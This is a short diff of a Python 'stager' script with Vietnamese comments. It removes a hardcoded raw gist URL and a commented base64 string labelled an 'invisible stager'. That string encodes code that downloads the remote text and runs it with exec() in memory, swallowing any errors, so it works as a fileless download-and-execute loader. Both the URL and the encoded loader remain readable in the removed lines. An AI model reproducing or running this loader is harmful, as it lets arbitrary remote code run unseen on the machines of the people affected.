@@ -2,7 +2,7 @@ import urllib.request
 
 def run_stager(): 
     
-    PAYLOAD_URL = "https://gist.githubusercontent.com/khanhpham-net/5780672f4d0f8a0342ab50258472674f/raw/d7817251c616d7bf9a00751a1ded0fcbb08545c3/gistfile1.txt"
+    PAYLOAD_URL = ""
     
     try:
         #  Kéo dữ liệu từ Internet về (Chỉ đọc, không ghi file)
@@ -23,5 +23,4 @@ if __name__ == "__main__":
 
 
 
-    # Chuỗi Base64 mới: Stager tàng hình 100% 
-    # encoded_stager = "aW1wb3J0IHVybGxpYi5yZXF1ZXN0CmRlZiBydW5fc3RhZ2VyKCk6CiAgICBQQVlMT0FEX1VSTCA9ICJodHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2toYW5ocGhhbS1uZXQvNTc4MDY3MmY0ZDBmOGEwMzQyYWI1MDI1ODQ3MjY3NGYvcmF3L2NhMWU0NThlZWI4YWJlNTg5OTk4ZDZhNDgzOTA0MGQ2ZjA0MTVlMzYvZ2lzdGZpbGUxLnR4dCIKICAgIHRyeToKICAgICAgICByZXEgPSB1cmxsaWIucmVxdWVzdC5SZXF1ZXN0KFBBWUxPQURfVVJMKQogICAgICAgIHJlc3BvbnNlID0gdXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXEpCiAgICAgICAgbWVtb3J5X3BheWxvYWQgPSByZXNwb25zZS5yZWFkKCkuZGVjb2RlKCd1dGYtOCcpCiAgICAgICAgZXhlYyhtZW1vcnlfcGF5bG9hZCwgZ2xvYmFscygpKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBwYXNzCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBydW5fc3RhZ2VyKCk="
+
